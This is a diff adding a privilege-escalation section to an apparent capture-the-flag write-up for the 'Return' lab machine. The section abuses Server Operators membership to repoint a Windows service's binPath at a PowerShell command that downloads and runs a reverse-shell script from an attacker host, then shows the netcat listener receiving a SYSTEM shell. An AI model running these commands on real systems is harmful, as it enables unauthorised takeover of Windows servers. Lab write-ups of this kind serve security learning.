@@ -105,11 +105,72 @@ e59d5**REDACTED**52a84
 
 ## Privesc
 
-### Server Operators Privilege
+### Server Operators Privilege --> SYSTEM Access
+Check the different privileged groups in Windows AD: https://cube0x0.github.io/Pocing-Beyond-DA/
 
+```console
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop> net user svc-printer /domain
+User name                    svc-printer
+Full Name                    SVCPrinter
+Comment                      Service Account for Printer
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
 
+Password last set            5/26/2021 12:15:13 AM
+Password expires             Never
+Password changeable          5/27/2021 12:15:13 AM
+Password required            Yes
+User may change password     Yes
 
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   11/18/2021 9:08:25 PM
 
+Logon hours allowed          All
 
+Local Group Memberships      *Print Operators      *Remote Management Use
+                             *Server Operators
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
 
+Exploit commands on `Return` box:
 
+```console
+sc.exe config vss binPath="C:\Windows\System32\cmd.exe /c powershell.exe -c IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.5/revshell.ps1')"
+
+sc.exe start vss
+```
+
+Start HTTP server on Kali:
+
+```console
+# python3 -m http.server 80                                               
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.108 - - [19/Nov/2021 04:32:19] "GET /revshell.ps1 HTTP/1.1" 200 -
+```
+
+Start `nc` listen:
+
+```console
+# nc -lvnp 443                    
+listening on [any] 443 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.11.108] 59341
+Windows PowerShell running as user PRINTER$ on PRINTER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+nt authority\system
+PS C:\Windows\system32> 
+```
+
+### root.txt
+
+```console
+PS C:\Users\Administrator\Desktop> cat root.txt
+57ee**REDACTED**d271
+```
